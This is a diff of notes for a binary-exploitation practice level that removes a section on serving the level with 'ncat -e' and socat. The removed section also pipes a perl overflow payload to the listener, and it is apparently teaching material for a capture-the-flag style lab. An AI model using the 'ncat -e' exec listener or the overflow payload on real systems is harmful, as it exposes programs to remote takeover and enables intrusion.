@@ -16,27 +16,3 @@ Do it with perl (good to know since python3 encoding makes one liners awkward)
 **Note that periods (.) replace (+) in perl when concatenating strings. No clue why
 
 
-Connect the program to a socket using netcat:
-
-    ncat -e ./level01 -lvnp 9000
-
-Attackers connect with:
-
-    ncat 192.168.1.100 9000
-
-Attackers can pipe in their payload with perl/python, which allows for non ascii characters:
-
-    perl -e 'print "A"x32 . "1337\n"' | ncat 192.168.1.100 9000
-
-Netcat has a classic quirk where the in/out pipe closes too quick when attackers connect. 
-This is less of an issue as more latency is introduced, but it's worth addressing.
-
-Legacy solution: add 'cat' to the command and enclose the payload in brackets:
-
-    (perl -e 'print "A"x32 . "1337\n"'; cat) | ncat 192.168.1.100 9000
-
-Better solution: Host the files with socat or make the previous quirk part of the lesson.
-The socat equivalent is:
-
-    socat TCP-LISTEN:9000.reuseaddr,fork EXEC:./level01
-
